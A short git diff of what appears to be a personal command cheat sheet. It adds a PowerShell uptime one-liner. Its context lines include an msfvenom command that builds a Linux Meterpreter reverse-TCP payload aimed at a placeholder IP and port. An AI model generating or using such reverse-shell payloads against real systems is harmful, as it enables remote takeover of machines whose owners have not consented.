@@ -216,3 +216,11 @@ docker run -d --hostname my-rabbit --name rabbitlocal -p 8080:15672 -p 5672:5672
 ```
 sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o <file_name>
 ```
+
+### Windows
+
+* Powershell
+
+```
+(get-date) - (gcim Win32_OperatingSystem).LastBootUpTime # uptime
+```
